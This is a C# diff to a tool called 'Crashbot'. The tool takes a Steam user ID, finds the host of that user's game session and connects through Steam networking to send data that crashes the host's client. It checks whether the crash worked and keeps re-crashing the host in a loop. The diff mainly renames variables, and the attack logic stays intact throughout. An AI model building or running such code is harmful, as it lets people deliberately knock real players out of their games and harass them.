@@ -69,14 +69,14 @@ namespace Crashbot
                 string steamid = Program.ReadSteamId();
                 if (string.IsNullOrEmpty(steamid))
                     continue;
-                ulong target = ulong.Parse(steamid);
+                ulong originalTarget = ulong.Parse(steamid);
 
                 // Initiate the connection
-                var t = new CSteamID(target);
-                var res = Steamworks.SteamFriends.RequestUserInformation(t, true);
+                CSteamID originalUser = new(originalTarget);
+                var res = Steamworks.SteamFriends.RequestUserInformation(originalUser, true);
                 Steamworks.SteamAPI.RunCallbacks();
 
-                string targetName = Steamworks.SteamFriends.GetFriendPersonaName(t);
+                string targetName = Steamworks.SteamFriends.GetFriendPersonaName(originalUser);
                 if (targetName.Equals("[unknown]"))
                 {
                     bool wait = true;
@@ -91,16 +91,15 @@ namespace Crashbot
                         Thread.Sleep(10);
                     }
 
-                    targetName = Steamworks.SteamFriends.GetFriendPersonaName(t);
+                    targetName = Steamworks.SteamFriends.GetFriendPersonaName(originalUser);
                 }
                 Console.WriteLine($"[{DateTime.Now}] Targeting '{targetName}' = {res}");
 
                 // Check if the target is the host, if not, target the host
-                ulong tmp_target = target;
-                tmp_target = Program.VerifyHostSteamid(t, target);
+                ulong hostTarget = Program.VerifyHostSteamid(originalUser, originalTarget);
 
                 Console.WriteLine($"[{DateTime.Now}] Connecting...");
-                var (conn, info) = ConnectAndWait(tmp_target, LongTimeoutOptions);
+                var (conn, info) = ConnectAndWait(hostTarget, LongTimeoutOptions);
 
                 if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                 {
@@ -120,7 +119,7 @@ namespace Crashbot
 
                 // Check if the client crashed
                 Console.WriteLine($"[{DateTime.Now}] Checking target...");
-                var (_, info2) = ConnectAndWait(tmp_target, ConnectionTimeoutOptions);
+                var (_, info2) = ConnectAndWait(hostTarget, ConnectionTimeoutOptions);
 
                 bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
                 Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");
@@ -129,8 +128,8 @@ namespace Crashbot
                 int count = 1;
                 while (crashed)
                 {
-                    tmp_target = Program.VerifyHostSteamid(t, target);
-                    var (conn_x, _) = ConnectAndWait(tmp_target, LongTimeoutOptions);
+                    hostTarget = Program.VerifyHostSteamid(originalUser, originalTarget);
+                    var (conn_x, _) = ConnectAndWait(hostTarget, LongTimeoutOptions);
                     Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                     Thread.Sleep(500);
                     Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
@@ -185,8 +184,7 @@ namespace Crashbot
 
         private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
         {
-            var steamuser = new SteamKit2.SteamID(target);
-            CSteamID cSteamID = new(steamuser.ConvertToUInt64());
+            CSteamID cSteamID = new(target);
 
             SteamNetworkingIdentity remoteIdentity = new();
             remoteIdentity.SetSteamID(cSteamID);
